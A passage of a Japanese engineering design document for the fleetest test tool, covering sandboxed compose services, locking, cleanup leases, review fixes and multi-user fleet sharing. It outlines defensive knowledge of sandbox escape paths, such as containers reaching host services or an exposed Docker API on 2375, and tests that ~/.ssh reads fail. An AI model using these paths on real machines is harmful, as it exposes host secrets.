  **割り当て済みブロック**(新規の ext4 で 69.4 MB)。閾値は置かない(人が見て `reset` を決める)。読み取りは FTServices `RuntimeSizes`
  (純粋・実データの fixture で固定)。**UDP の経路の確認は赤へ上げた**(⑤の締め・ユーザー決定 2026-10-15): 3 回届かなければ `ServicesError`(phase wait)で run を
  始めない(警告の文言をそのまま detail に。Rancher の原因も同じ)。判断の材料は Apple = 3 回の probe で必ず応答(1 回目の取りこぼしあり)・
  Rancher の SSH 転送方式 = 3 回とも届かない、の 2 系統。`servicesWarnings` に残る警告は `adb reverse` だけになった。
  **赤の陽性対照**(M1Ultra・Rancher の SSH 転送方式): `/udp` を宣言した compose を送ると、サービスは上がった後に
  「`127.0.0.1:<p>/udp (published by docker) did not answer 3 probes of 1s each; TCP on the same path did answer — Rancher Desktop is
  using the SSH port forwarder … switch with \`rdctl set …\` (phase: wait) — no scenario was run」で止まり、2.4 s で片付いた。
  Apple(この Mac)は同じ compose で probe 1 回目に応答して上がる。
  **並列レーン**(sut-ec-mobile `ios-5`・5 本の名指し = 6 シナリオ): 1 組のサービスを 5 レーンが共有して 5/6 緑・サーバーの応答は
  7〜8 ms・片付け 2.6 s。赤の 1 本(`カートの数量を操作できること.S0020`)は単独でも落ち、履歴では 10/14 11:45(ホストのサーバーの頃)から
  iOS / Android とも連続で赤 = SUT 側の既存の不一致で、サービス化とは無関係(`results trend` で確認)。
  **Codex レビュー(⑤・2026-10-15)で直したこと**: ①`up` の作成(pull / build / 待ち)を排他の外へ(握ったままだと起動中の所有者へ `down` /
  引き取りの SIGTERM が届く前に排他で止まった)②`reset` の「確認 → 削除」を排他の中へ・`--force` は所有者へ合図 → 排他の外で待つ → 取り直して消す
  ③`up` は生きている控えの phase を見る(starting は待つ・tearingDown は消えるまで待つ・running だけ already up。事前確認と控えの書き込みの間に
  負けた所有者は相手を待って already up として返す)④既存の受け手にも新しい ask(ft_services)を一度だけ届ける台帳(`.fleetest/mcp-ask-offered.json`)
  ⑤Docker 管理口の検知は exposed > unknown > clear で集約 ⑥adb reverse は `--no-rebind`(利用者の転送を上書きしない。実測: 既存の
  18080→9000 は `down` の後も残る)⑦所有者のログの置き場をシナリオの書き込み拒否に足し O_NOFOLLOW で開く ⑧保存するサービスログに伏せ字
  ⑨api run の run-setup.sh 失敗時もログ保存 ⑩pull / load に中断のリレー ⑪コメントだけの compose.yaml(拡張の雛形)は「宣言なし」として起動しない
  (読み取りが mapping を要求して置いただけの run を壊していた)⑫MCP の CLI 待ちを協調プールの外へ ⑬PostgreSQL の例に PGDATA。
  見送り: reverse の解除失敗を控えに残して再試行(台帳が永遠に残る害のほうが大きい。`--no-rebind` の失敗の警告が外し方を言う)。
  **Codex レビュー 2 回目(2026-10-15)で直したこと**: ①ask の台帳 `.fleetest/mcp-ask-offered.json` をシナリオの書き込み拒否に足す
  ②提示済みの確定を settings の保存の**後**へ(先に書くと保存に失敗した ask が提示済みになる)③台帳が無ければ一覧の全部を一度提示する
  (「台帳なし = ft_start_run 提示済み」の推定は、新規導入で ask を外した形と区別できないので置かない。台帳より前の受け手では外していた ask も
  1 度だけ戻る)④`reset --force` が排他を押し切ったときは**そのとき見た持ち主のロックだけ**を外す(正常に取れたら withLock の解放だけ。
  無条件の forceRelease は取り直した別の up のロックを消していた)⑤`reset --force` は「合図 → 排他の外で待つ → 取り直して持ち主がいないことを
  確かめてから同じ排他の中で消す」を最大 3 周(待っている間に現れた所有者は止め直す)・待ち切れなければ**何も消さずに止める**(作り続けている
  相手の控えを消すと、消した後に資源が作られる)・**生きている run は --force でも止めない**(`ForceDecision` = 純粋関数)⑥所有者の作成は
  ボリュームの前でも中断を見る ⑦adb reverse は張る前に `--list` で宛先を見る(上の「実機」。別の宛先 = 赤)。#9 は既知の制約として user-docs に書いた。
  **Codex レビュー 3 回目(2026-10-15)で直したこと**: ①`reset --force` は**排他を押し切らない**(取れなければ何も消さずに止める。
  ロックの強制解除 `forceRelease` の経路そのものを撤去 = 照合と削除が原子的でなく、取り直した別の持ち主のロックを消す。死んだ持ち主と
  記録の無い古いロックは取得が回収するので、取れないのは生きている持ち主だけ)②読めない控えも判定に渡し、ファイル名の pid が生きていれば
  消さない(`blockedByUnreadable`。非 force の文言も「pid が終わってから --force」に)③rebind で張れなかったときは宛先を照会し直し、
  同じ宛先と確認できたときだけ通す(確認できない = 衝突で赤。一覧の取得失敗や一覧後の競合で別の宛先が警告のまま通っていた)
  ④合図する周を 3 回で止め、**最後の周は判定だけ**(所有者が終わっていれば消す・まだいれば「3 回止めてもまだいる」と事実だけ言う)。
  **Codex レビュー 4 回目(2026-10-15)で直したこと**: ①`services.lock` を mkdir から**固定ファイルの flock**へ(取得時の孤児回収
  「照合 → パスで削除」にも同じ競合があり、2 者が同時に本体へ入れた。回収の処理そのものを無くす。`ServicesLockTests` の 8 スレッド × 10 回で
  本体が重ならないことを固定)②adb reverse は張れなかった理由を問わず(時間切れ・通信断も)一覧を照会し直し、転送が無いと確認できたときだけ
  警告・一覧も読めなければ状態不明として赤(「転送が無い」「届かない」は確認できたときだけ言う)。
  **Codex レビュー 5 回目(2026-10-15)で直したこと**: ①`.fleetest/services.lock/` をシナリオの書き込み拒否に足す(flock は inode に付くので、
  子がファイルを消す・置き換えると別の inode を握った 2 者が同時に入る。O_NOFOLLOW では unlink を防げない。Seatbelt を掛けて rm / mv / touch /
  ディレクトリの rename の拒否を固定)②引き取りのテストは旧方式のディレクトリの不在でなく、待ちの間の `currentHolder == nil` を見る。
  **残り**: なし(§17 の設計分は完了)。**コンテナ → 外部の UDP** は設計どおり止まったまま(作らない)
- **②で実測して分かったこと**: Apple の名前付きボリュームの既定は **512 GiB のスパースなイメージ**(`-s` は付けない)/
  `container build` と `run` は `--label` を、`run` は `--init` も受ける(1.1.0 の help)/ **run の親を `kill -9` しても孤児は
  生まれない**(サービスを持つのは `[local]` の子 run で、親の死を `ParentDeathWatch` で見て自分で片付ける)。**控えの持ち主の
  子を `kill -9` すると残り、`hooks reap` が ID で消す**(実測で回収できた)/ 1 シナリオの run に載せたサービス(PostgreSQL +
  busybox の httpd)の所要: Apple 起動 1.5 s + 待ち 1.3 s・Docker 起動 0.5 s + 待ち 1.2 s(初回は中継イメージのビルドと pull で
  +15 s)・片付けは `stop_grace_period` の既定 10 s を SIGTERM を無視する busybox が使い切る / `services status` はランタイムを
  起こさない(止まっていれば「使えない」と出る。起こすのは run だけ)/ **Apple の `inspect` の JSON** は `[{configuration, id,
  status: {networks: [{ipv4Address: "192.168.64.4/24", …}], startedDate, state: "running" | "stopped"}}]` で**終了コードの欄が無い**
  (`exec` と前面の `run` は終了コードを返す)。読み方は `RuntimeListing.containerState` / `appleAddress` に実データの fixture で固定 /
  **Apple の `network delete` / `volume delete` は無いものにも "failed to delete one or more …"(exit 1)** と言い "not found" を
  含まない → 片付けは削除に失敗したら一覧で実在を確かめる(`ServicesTeardown.absenceConfirmed`。セルフレビューの陽性対照で、
  作れなかったネットワークを控えに持つ孤児が永遠に残るのを再現して直した)/ **Docker の常駐サービスは `create` → 2つ目以降の
  `network connect` → `start`**(compose と同じ順。`run -d` の後につなぐと、起動直後に別のネットワークの相手を引くサービスが落ちる)/
  **自動選択(`runtime` 未設定)で Apple の常駐サービスを起こすのは Docker が使えないときだけ**(`mayStartApple`。Docker が
  上がっているのに Apple を起こしてから「両方使える」と断っていた = セルフレビューの Docker 側の対照で露見)/ **サービスの `networks` に書いた `default` は宣言不要**(compose の暗黙のネットワーク。計画は内部ネットワークへ写す。同じ対照で露見)

#### 片付けの保証(今の仕組みからの変更)

- **控えは最初の資源(ネットワーク)を作る前に必ず書き、書けなければ開始しない**(今の `writeLease` は run-teardown.sh が
  あるときだけ書く = compose.yaml だけの構成では控えが無い。Codex レビュー 2026-10-14 #13)。**削除の失敗・中断・壊れた控えは未回収として残し**、
  次の run と `hooks reap` が再試行する(今は削除が失敗しても控えを消す)。控えの中身(Codex レビュー 2026-10-14 #15): ランタイムと**解決した
  接続先**・名前の接頭辞と**世代**・承認済みのサービスの一覧(中継と区別)・公開ポート・adb reverse の serial とポート・
  **秘密の参照名(値は書かない)**。**回収は控えの計画で動き、現在の宣言から作り直さない**(compose が変わっていても旧の
  資源だけを消す)
- 控えは **`.fleetest/hooks/<pid>~<接頭辞>.json`**(ファイル名に接頭辞を含める = JSON の本文が壊れても、どのプロジェクトの
  起動を止め、`reset --force` でどの控えを解くかを特定できる。Codex レビュー3 2026-10-14 #2。`dispatch.queue` のチケット名と同じ流儀)に上の欄を足す。孤児の回収は run-teardown.sh(枠の中)→
  **接頭辞で列挙し、控えの世代・資源 ID と一致するものだけ**を削除する順(接頭辞だけで消すと、再試行のときに同じ固定名の
  新しい世代まで消す。Codex レビュー2 2026-10-14 #7。通常終了・引き取り・孤児回収で同じ判定)。**名前付きボリュームは消さない**(既定で残す)。**削除は控えだけで撃てる**ので、compose.yaml が
  書き換えられていても片付く(プロファイルを読み直さない規律と同じ)
- `fleetest remote clean` の順序(`devices down` の前に撃つ)は変えない

#### 変えるもの・足すもの(実装時のチェックリスト)

- **FTServices(新ターゲット・CLI 専用)**: compose.yaml の解釈(`ServiceSpec`)・`ComposePolicy`(純粋)・実行計画(`ServicePlan`。名前・
  ネットワーク・中継・hosts ファイル・プロキシの割り当て・ビルドの中身の digest までを純粋関数で決める)・`ServicePolicy`・
  変数の展開(秘密の参照名つき)。Package.swift に Yams と `FTServices` を足し、`fleetest` / `fleetest-mcp` だけが依存する
- FTCore: broker に方針を差し込む口(protocol)・用途を持つ `ScenarioSandbox.Scope`・`RunHookLeaseInfo` の欄の追加(ファイル名に接頭辞)・
  マシン設定 `services.runtime` / `hooks.writablePaths`(未知のキーはエラーの規律に載せる・`writablePaths` の重なりの検証)
- fleetest: 2つのランタイムの実行(`DockerBackend` / `AppleContainerBackend`)・起動完了の待ち・回収・
  `RunHookRunner` を `sandbox-exec` 経由の起動へ・中継コマンド・中継のコンテナ(転送は両側 `nodelay`・UDP も転送)・宣言した UDP の起動後の到達確認・プロキシのゲートウェイ IP での待ち受け・
  中身が変わらないビルドの省略・Apple Container へ渡すパスの形(build context は宣言どおりの形で渡し `/private/` なら止める・マウントは実体パス)・
  `fleetest services reset`(人が打つ一掃。接頭辞のコンテナ・ネットワーク・ボリューム)・`fleetest services up` / `down` /
  `status`・イメージのファイルの読み込み(`docker load` / `container image load`)・マシン側の秘密のファイルからの展開と
  run-setup.sh への受け渡し(参照している名前だけ)・失敗時のサービスのログの保存
- MCP: `ft_services`(承認の対象。`ArgumentBounds`・ツールの集合を固定するテストの更新 = .claude/rules/mcp.md)・
  **インストーラが書く承認設定(今は `ft_start_run` だけ ask)に `ft_services` を足す**(installer-agents.md の
  ステップと 1:1)
- 子プロセス: ランタイムの CLI(pull・build は分単位)とスクリプトは **`InterruptRelay` で中断(SIGINT / SIGTERM)を
  プロセスグループへ届ける**。**外部 CLI とスクリプトは `ParentDeathWatch` を実装しない**(fleetest の子だけの仕組み)→
  親が SIGKILL されたときの保証は控えの回収だけ(Codex レビュー 2026-10-14 #11)。パイプ読みは process-lifecycle.md の規律・`Shell.run` の終了コードを見る
- 既存コードの先行修正: `SandboxProxy` のポートの範囲検査(#19 = 修正済み)・プロキシの解決後 IP の検査(#3 = open-issues)・
  `doctor` の「非ループバックの 2375 / 2376」検知(#5)
- 契約: run の NDJSON にサービスの進行イベント(起動・待ち・UDP の確認の警告)を足すなら **`ProtocolVersion` +1**
  (拡張の実行ログビューが受ける)
- lease: `services up` の明示の印(置き場は `mcp-<鍵>.lease` と同じ台帳。`writeDeniedPaths` に載せる)
- マシン設定: `services.buildSources`(読み取り専用のビルド元)・秘密のファイルの置き場(+ 子の読み取りの拒否)・
  `services.publishForPhysicalDevices`(LAN アドレス。実機のレーンを含む run だけ効く)・Apple のボリュームの大きさの既定(定数)
- 実機: ワーカーが端末に付いたときの `adb reverse`(TCP の公開ポートごと)と終わりの解除・実機のレーンを含む run での
  `host_ip` の差し替え(`ServicePlan` に「実機を含むか」を入力として渡す = 純粋関数のまま)
- 依存: Yams(`FTServices` だけ。テストで固定するのは「シナリオ実行バイナリの**推移的なリンク依存**に入らないこと」= Package.swift の
  ターゲットの依存の走査。受け手の解決・取得で Yams が降りてくることは防げないし断定しない)・
  中継のイメージの Dockerfile(公式の `alpine` の digest と `socat` の版を固定)
- 拡張: 雛形(`runHookScaffold.ts` / `i18n/strings/hookScaffold.ts`)に compose.yaml を足し、コメントを新しい規則へ
- `fleetest remote setup` の前提判定: compose.yaml を使うプロファイルがあるときだけランタイムを見る
- docs: この節(と上の「開始/終了スクリプト」節の畳み込み)・design.md §11.7「壁の外に残るもの」・sandbox-seatbelt.md §8.7・
  利用者向け(security/sandbox・limitations・access・extending・fleet/adding_physical_devices の en/ja)・スキル(installer-agents.md の対応)・
  **規則ファイル**: `.claude/rules/remote.md`(「リモート制御」の段落 = 枠の外のスクリプトを前提にした規律)・`.claude/rules/executor.md`
  (サンドボックスの規律に用途つき `Scope`・`ServicePolicy`・compose の許可表を足す)・`.claude/rules/process-lifecycle.md`
  (`InterruptRelay` の登録の位置が run-setup.sh を名指し)・CLAUDE.md「どこであれ新しいものを足すとき」に「compose の許可表 /
  `ServicePolicy` に足す」の1行(最終セルフレビュー 2026-10-14)
- テスト: `ComposePolicy` の断るもの1件ずつ(両方向の変異)・`ServicePlan` の両ランタイムの計画・`ServicePolicy`・
  起動の配線(スクリプトが入口を通ること)・**`volumes.*.driver_opts` の bind が断られること**・**秘密のファイルが枠の中から
  読めないこと**(証人)・予約ポートの拒否・コンテナの終了で待ちが即座に失敗すること・証人のスクリプト(`~/.ssh` の読み取り・ホームへの書き込み・
  ランタイムへの接続・外部への通信が全部失敗すること。**残置はプロセスグループの子孫が止まることと、控えの子 PID が
  回収されることまで** = 離脱した子孫を必ず検出する期待は置かない)・証人のコンテナ(外への通信が
  両ランタイムで失敗し、許可した宛先だけプロキシで通ること)・`/private/` のパスの扱い(**build context には宣言どおりの形**を渡し `/private/` なら止めること・**マウントには検査済みの
  実体パス**を渡すこと = 別々に固定。Codex レビュー4 2026-10-14 #5)・ビルドの省略(**サイズか mtime が変わる変更**なら撃つ / 変えなければ撃たない の両方向。同サイズ・同 mtime の変更は対象外と明記)・UDP の経路の確認(届くランタイムで警告が出ず、SSH の転送方式の Rancher Desktop で警告と原因が出る = 両方向。乱数が違う応答を届いたと数えないこと)・実データ(Postgres + WireMock の compose)を
  両ランタイムでこの Mac と M1Ultra。枠の拒否は `log stream` で拾う(sandbox-seatbelt.md §9.1)

#### 残る穴(利用者向けにも書く)

- **Apple Container のコンテナからは、Mac の全アドレスで待ち受けるサービスに届く**(ゲートウェイの IP 経由。
  実測。`127.0.0.1` だけで待ち受けるものには届かない)。SSH・画面共有・ファイル共有などを開けている Mac では、
  コンテナからそこへ繋げる。Docker の外へ出られないネットワークからは届かなかった。**この Mac の棚卸し**(2026-10-14・
  sudo なし = root の待ち受けは見えない): TCP は AirPlay の受信(ControlCenter・5000 / 7000)・メディアの共有(3689)・
  連係機能(rapportd・3ポート)。ほかに mDNS などの UDP。利用者向けには「信頼できない compose を動かす Mac では、
  AirPlay の受信・共有の各機能を切る」と案内する
- **実行基盤の管理口がコンテナから届かないことが前提**(Codex レビュー 2026-10-14 #5): Docker API を `0.0.0.0:2375` で TCP 公開している Mac では、
  Apple のコンテナがゲートウェイ経由でそこに届き、ホストの秘密をマウントできる → `doctor` と起動時に、**非ループバックで
  2375 / 2376 が LISTEN なら止める**(**既知の危険な設定の検知であって、管理口に届かないことの証明ではない** = 12375 のような
  別のポートは拾えない。Codex レビュー2 2026-10-14 #4)。**「実行基盤の管理口を非ループバックで公開しない」は利用者の運用の前提**として、マシン側の
  docs(user-docs/security/limitations)に書く。Docker の実測「internal からゲートウェイへは refused」は**VM の橋のアドレスに届いて
  待ち受けが無かっただけ**で、VM の中の待ち受けが閉じている保証ではない(未実測に載せる)
- **ビルドの中のコードは外へ出られる**(持ち出せるのは `scripts/`・**`services.buildSources` の clone 全体**(`COPY . .` で
  `.git` や `local.properties` も入る)・イメージの中身)
- **イメージの中身は検査しない**(`image:` の取得元を絞らない)。信頼できるイメージだけを使う。**取得先はプロジェクトの
  中身(AI が書ける)が決める = 親の外向き通信の宛先が `allowedDomains` の外に出る唯一の経路**(帯域は名前に載る分だけ)。
  レジストリの許可リスト(マシン側)は、要望が出たら足す
- **localhost に公開したサービスには、シナリオも繋げる**(今の localhost の扱いと同じ)

#### 実測していないこと

- Docker Desktop・OrbStack(実測は Rancher Desktop だけ。どの機械にも無く、入れずに未実測とした = ユーザー決定 2026-10-14。
  `host.docker.internal` と UDP の転送は製品・版・設定で違うので、実装では起動後の到達確認で守る)
- 非公開のレジストリのイメージ(取得は親が利用者の資格情報で行う。実装のときに確かめる)
- プロキシのゲートウェイ IP での待ち受けが LAN から見えないこと
- Apple で同じホストポートを `127.0.0.1` と LAN アドレスの2つに束縛できること(実機の形の前提)・`-v <file>:/etc/hosts:ro`
- Docker の gRPC の転送方式での LAN 公開(ALF の扱い・UDP が LAN から届くか)。SSH の方式は TCP だけ LAN から届いた
- Docker の外へ出られないネットワークから **VM の中の待ち受け**(dockerd の TCP 等)が閉じていること(実測は橋のアドレスで
  「refused」= 待ち受けが無かっただけ。Codex レビュー 2026-10-14 #5)
- `DOCKER_CONFIG` を専有のディレクトリに向けたときの資格情報の写し方(`credsStore` の鍵がそのまま効くか。Codex レビュー 2026-10-14 #2)

## 18. 複数ユーザー(2026-08-18 検討・方針決定。M0 の一部を実装中)

**定義**: 同一信頼グループ内の複数開発者が、それぞれの Mac(発行側)からランナーフリートを
共有する。**認証と隔離は作らず、調整と帰属を作る**(§15.3 の (a)「同一信頼グループ限定」を
複数ユーザー化しても維持する)。

**macOS の制約が方針を決める**: ランナー上のユーザー分離は実行面で成立しない ——
Aqua セッション(コンソールログイン)は1つしか立たず、シミュレータ・XCUITest・FM は
それを前提にする(§5・§9)。ユーザーごとの macOS アカウントを作っても実行できるのは
コンソールの1人分だけ。**本当に隔離が要るなら機械ごと割り当てる**(チーム A は M1Max、
チーム B は M1Ultra)—— フリート定義と実行プロファイルの devices が持つ `machine` で
既に表現でき、実装不要。

### 18.1 単一ユーザー前提の棚卸し(壊れる箇所)

| # | 箇所 | 複数ユーザーで起きること |
|---|---|---|
| 1 | `dispatch.lock`(fail fast・待ち行列なし) | 衝突が日常化。「今誰が使っているか」を毎回 ssh で見に行く運用になる。**M2 で解消**: `remote status` の LOCK 欄・モニターの機械の行の錠前・拡張の `fleetest.remoteWaitLock`(待つ秒数) |
| 2 | `RemoteDispatchLockInfo`(issuerHost + pid のみ) | 発行側ホスト名では人を識別できない(共用機・DHCP 名)。帰属が取れない |
| 3 | `<base>/work` が1つ | 同名プロジェクトを持つ2人の rsync `--delete` が互いのシナリオを上書き。リモートの results/ に両者の run が混ざり、`collect` が他人の run 実績・録画まで手元へ引き込む |
| 4 | `<base>/tool` の版(align が発行側 HEAD に合わせる) | 版の違う2人が交互に使うと align + 再ビルド(数分)を毎回往復する(綱引き)。拡張の「更新して実行」が他人の作業中の版を勝手に動かす |
| 5 | ~~machineName(発行側の登録簿から一方向に設定。§14 決定4)~~ | **解消済み** — 2026-08-17 のマシン登録名の廃止(RemoteHostEntry から machine キャッシュを撤去・適合チェックは rev と toolchain のみ)で問題ごと消滅した。M1 で予定していた「正をランナー側へ移す」は対象自体が無い |
| 6 | `remote clean` / `devices down` | 他人の実行中 run を殺す(modal 確認はあるが「使用中か」が見えない)。**M2 で解消**: `remote clean` はロックを読んで中止(`--ignore-lock` で押し切る)・拡張の一括停止とデバイス削除/作成の modal が保持者を出す |
| 7 | モニター/配信 | 他人がタイルを眺めているだけで Android E2E が赤くなる(配信とテストの干渉は実測済み。docs/verification.md)。本人には run が見えていない。**M2 で解消**: 占有中の機械のライブ配信を自動で畳む(§18.7)。**同じデバイスの二重配信も止める** |
| 8 | モード A の再起動復帰 | 「誰が解錠しに行くか」が決まっていないと全員が止まる |
| 9 | SSH 鍵(authorized_keys に1本) | 失効(退職・端末紛失)の単位が無い(§15.3 で既知)。**運用で対処**(1人1鍵。remote-runner-setup.md)—— 鍵に帰属を束ねる案は §18.8 |
| 10 | 孤児 hooks(終了スクリプトの控え) | **ポートはホスト全体の資源**なので、他人の死んだ run の残骸で自分の run が詰まる。ネームスペースは work を分けるがポートは分けられない。**M2 で解消**: ディスパッチ開始時に全発行者ぶんを代行実行する(`RemoteHooksReap`) |
| 11 | ディスク(`users/*/work` が人数ぶん) | `.build`・results・録画が発行者ごとに積み上がるのに「誰のぶんが食っているか」が見えない。**M2 で緩和**: `remote clean` が発行者別の使用量を出し、回収済みの録画はディスパッチが消す(§15.4) |

### 18.2 段階計画(M1 以降は需要ゲート = 2人目の利用者が実際に現れてから)

- **M0(単独でも価値がある。実装順は 18.5)**: 発行者 ID(LocalConfig の `issuerId`、
  既定 `USER@hostname`)をロック info と run 実績に載せる(**認証ではなく自己申告** ——
  §15.1 の「適合チェックは認証ではない」と同じ規律の調整用)/ `--wait-lock [秒]`
  (バックオフ付きポーリング。**時刻での自動奪取は入れない** —— 奪うのは `--force-lock`
  明示だけ、の既存決定を維持)/ 1人1鍵と失効・ランナーの解錠当番の文書化
- **M1(共有が日常化したら)**: 発行者ネームスペース(**実装済み: 2026-08-18。仕様は §18.6**)/
  ~~machineName の正をランナー側へ移す~~(**不要になった** — 18.1 #5 のとおり、対象の機構が
  2026-08-17 の登録名廃止で消滅済み。M1 はネームスペースで完結)
- **M2(実装済み: 2026-08-31。仕様は §18.7)**: 占有の観測と配布(ssh を増やさない)/
  配信の自動退避 / 破壊的操作前の占有表示 / 拡張からの `--wait-lock` / 孤児 hooks の横断代行 /
  録画の回収後削除 / 発行者別ディスク。**同一ランナーでの並行実行(デバイス分割)は作らない** ——
  ホスト内のデバイス割当・SPM ビルドロック・results 同時書き込みへ波及する大工事で、
  「機械ごと割り当てる」で同じ需要を満たせる(Phase 3 の分散スケジューリングへ送る)

### 18.3 版衝突の回避(ピン運用)

配布モデルが衝突を「恒久的な分岐」ではなく「一時的な遅れ」にしている —— 全員が同じ
upstream main を clone して update.sh で追従するので、2人の rev はほぼ常に祖先関係にある。
真の分岐(ブランチ)はツール本体の開発時だけ。よって**ランナーは main の特定 rev に留め、
遅れている側の人間が自分を上げる**のが原則。規則は3つ:

1. **解消の向きを祖先関係で判定して案内に出す**(実装済み: 2026-08-18): 適合チェックが落ちたとき
   `git merge-base --is-ancestor` で3分類 —— 発行側が祖先 = **自分が古い**(update.sh を
   案内。align は勧めない)/ ランナーが祖先 = フリート更新が必要(規則3へ)/
   どちらでもない = ブランチ検証(共有ランナー不可・専用機を案内)。拡張の
   「更新して実行」も「自分が古い」ケースではランナー更新の選択肢を出さない
2. **align は dispatch.lock を取ってから実行する**(実装済み: 2026-08-18): align は
   `<base>/foundation-tester/.build` のバイナリを差し替えるので、実行中の run の下で走らせると
   run が SIGKILL で即死する(「E2E 中に swift build を打たない」と同型)。
   **複数ユーザー以前からの潜在バグ**(自分の run 中に別ターミナルから align しても踏む)
3. **フリートの版上げは §16.6 のカナリア手順**(1台更新 → 検証1本 → 展開)。実施者は
   当番(M0 で登録簿に持たせる)

**強制はできない**(同一信頼グループでは ssh で入れる人は誰でも align を打てる)。
規則1〜3は「正しい向きを最短経路にする」摩擦設計であって、アクセス制御ではない。
堅くしたい場合は機械ごと割り当てに戻る。

### 18.4 却下: リモートのチェックアウト先分離(再提案しない)

ユーザーごと(または rev ごと)に `<base>/users/<id>/foundation-tester` + `work` を分ける案。
ホスト側の衝突(align 綱引き)はきれいに消え、ブランチ検証も共有ランナーで可能になるが、
**2026-08-18 に却下**(ユーザー決定)。理由:

- **デバイス側の版状態は分離できない**(これが主因)。ブリッジはデバイスに載るので、
  版の違う2人が同じデバイスを交互に使うと: **Android は versionCode の引き下げインストールを
  拒否**するため、2026-08-14 の「revert で8台全滅・`adb uninstall` まで復旧不能」が
  **稀な事故から日常の交互利用で踏む形に変わる**。iOS もブリッジ版を跨ぐたびに再構築が走り、
  **warm ディスパッチ 12.6 秒の前提(ブリッジ再利用)が消える**
- 版の混在が一時的でなく恒常になるので、ホスト全域の共有状態ファイル
  (dispatch.lock の info.json・hooks の控え・frozen-*.json)の**版間互換が恒久的な保守義務**になる
- work の分離が強制される(受け手 Package.swift はツールクローンをパス依存で参照し、
  ディレクトリ名も `foundation-tester` 固定 —— §12 の罠。共有 work + ユーザー別 tool の
  中間形は無い)ため、M1 全体を一度に入れることになる

**再検討条件**: 共有ランナーでのブランチ検証に実需が出て、かつ①デバイス側の版ガード
(18.5 の 2)と②「同じランナーを共有してよいのはブリッジ版が同じ rev 同士」という
緩いピンをセットで入れられるとき。

### 18.5 実装順(2026-08-18 決定。基準は「単独でも価値がある順・事故を塞ぐ順」)

| 順 | タスク | 状態 |
|---|---|---|
| 0 | この §18 の設計記録 | 済 |
| 1 | `remote align` を dispatch.lock 配下に(18.3 規則2。既存の潜在バグ) | 済(2026-08-18。`remote setup` は install〜align 区間で保持し、verify の dispatcher が同じロックを取るので verify 前に解放する) |
| 2 | Android ブリッジ版のデバイス側ガード(デバイスの versionCode が期待より新しければ fail fast。大小比較 = 契約チェックなので「警告から」規律の対象外) | 済(2026-08-18。`AndroidDriver.downgradeRefusal`。install 前 + INSTALL_FAILED_VERSION_DOWNGRADE のレース + doctor サマリの3箇所) |
| 3 | issuerId + ロック info / run 実績への帰属 | 済(2026-08-18。`LocalConfig.issuerId` / 解決は `resolveIssuerId` の1箇所: **FT_ISSUER > 設定 > USER@hostname**。dispatch.lock の info.json と run.json の `issuer` に記録。**リモートの子へは `RemoteShell.remoteRunCommand` が `export FT_ISSUER` で運ぶ** —— ランナー機側で解決させると全員が共有アカウントの同じ値になり帰属が消える) |
| 4 | `--wait-lock [秒]` | 済(2026-08-18。奪わない・`--force-lock` と排他・ssh 到達不能は待たない。ポーリング10秒/経過ログ約60秒 = `WaitLockPolling` に根拠コメント付きで1箇所) |
| 5 | 祖先関係判定 + 案内の向き + 拡張ダイアログの選択肢制御 | 済(2026-08-18。判定は `RemoteCompat.classifyRelation`(pure)+ `revisionRelation`(RemoteCommands.swift の I/O。**fetch しない** — ランナーの rev がこの clone に無ければ unknown)。checkCompatibility は **published のときだけ**向き付き advice を append(未 push は unpublishedRevisionMessage のみ — align 案内が誤誘導になる)。`api remote-compat` に `revisionRelation` フィールド(追加 = 後方互換・ProtocolVersion 不変)。拡張は localBehind/diverged/unknown が1機でも居たら「更新して実行」を出さず理由の行を足す(remoteCompatGate.ts。拡張 0.0.538)) |
| 6 | 運用 docs(1人1鍵と失効・当番・カナリア手順)を remote-runner-setup.md へ | 済(2026-08-18。remote-runner-setup.md「複数人でフリートを共有する」+ トラブル表2行) |

### 18.6 発行者ネームスペース(M1。実装済み: 2026-08-18)

18.1 の #3(rsync `--delete` の相互上書き・results 混在・collect の他人分引き込み)の解消。
**事故の分離であってセキュリティ隔離ではない**(全員が同じ UNIX アカウント。§15.3 のまま)。

```
~/.fleetest/dispatch.lock        ← **機械に1本**(競合の実体はデバイス = マシンの資源。
                                    base の外に置く理由は §13「二重ディスパッチのロック」)
<base>/
├── foundation-tester/          ← tool。共有(§18.4 — 分けない)
└── users/<issuerId>/work/      ← 発行者ごとの WORK_DIR(TestProjects・results・.build・workspace)
```

- **これが唯一のレイアウト**(二重サポートしない — モードが2つあると版スキューと同型の
  恒常バグ族になる)
- **鍵は issuerId**。パスに使うので文字種を入口で検証する(`RemoteLayout.validateIssuerKey`:
  英数と `@ . _ -` のみ。黙って正規化しない)。**明示設定を推奨** —— 既定の
  `USER@hostname` はホスト名を含み、ホスト名は mDNS/DHCP でネットワークごとに変わり得る。
  鍵が変わると**ランナー上に新しいネームスペースが黙って生える**(work 再構築・履歴分断)ので、
  未設定のまま使うと `resolveLayoutIssuer` がプロセスごとに1回警告する
- **tool root は明示で渡す**: work が2階層深くなり、install.sh の既定
  `<work-dir>/../foundation-tester` が `<base>/foundation-tester` と一致しなくなったため、
  `remote setup` は `--tool-root` を明示で渡す(受け手 Package.swift のパス依存はそこを指す。
  ディレクトリ名 `foundation-tester` 固定の SPM 制約は共有クローンがそのまま満たす)
- **未 setup の発行者は fail fast(2段)**: ①ディスパッチは**転送より前**に
  `test -f <workDir>/Package.swift` を ssh で確かめて止める(`RemoteRunDispatcher.
  checkCompatibility` 末尾)—— 91 ガードに任せると、その前の rsync が
  `users/<issuer>/work/TestProjects/…` を**部分的に作ってしまい**、後の remote setup の
  プロジェクト作成がディレクトリ存在でスキップされて壊れる(§12 の既知の罠と同型。
  2026-08-18 に実ディスパッチで確認)②`remoteRunCommand`/`remoteExecCommand` の先頭にも
  同じガード(無ければ案内を出して **exit 91**。remote exec・monitor fan-out と、
  チェックと実行の間のレース用の防御。90 = バイナリ不在の隣の契約)
- **ホスト全体に残るもの**: dispatch.lock(1本)/ tool + .build(共有・ピン運用)/
  デバイス側状態(ブリッジ・シミュレータ。降版ガードが防御)。
  **hooks の控えは各自の work 配下のままだが、reap は全発行者分を横断する**
  (ポートはホスト全体の資源。ディスパッチ開始時の代行 reap も `remote clean` も
  `RemoteHooksReap.commandAcrossIssuers` で `users/*/work` を横断する)。frozen 台帳も work 配下で人ごとに分かれるが、
  助言的トリアージで run ごとに再判定されるため実害なし
- **remote clean は全発行者を対象にする**(ディスクはホスト共有資源。
  `RemoteCleanPlan` が `users/*/work/…` を find で列挙して掃く。グロブは使わない)

### 18.7 占有の観測・配信の退避・片付け(M2。実装済み: 2026-08-31)

**設計の要は「ssh を1本も足さない」こと**。占有を知りたいのは手元だが、`dispatch.lock` が
